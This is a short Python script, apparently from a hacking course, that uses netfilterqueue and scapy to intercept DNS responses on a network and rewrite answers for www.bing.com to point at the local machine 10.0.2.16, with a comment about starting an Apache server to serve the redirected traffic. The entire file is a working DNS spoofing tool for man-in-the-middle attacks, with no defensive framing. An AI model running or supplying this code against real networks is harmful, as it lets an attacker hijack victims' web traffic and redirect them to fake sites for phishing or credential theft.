#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# service apache2 start to start the web server in kali

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # convert packet in the queue into a scapy packet
    # print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.DNSRR):  # DNSRR for DNS Response and DNSQR for DNS Request
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofint target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16") # modify the response
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete all those fields so scapy will recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # convert back the scapy packet to its original form
            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()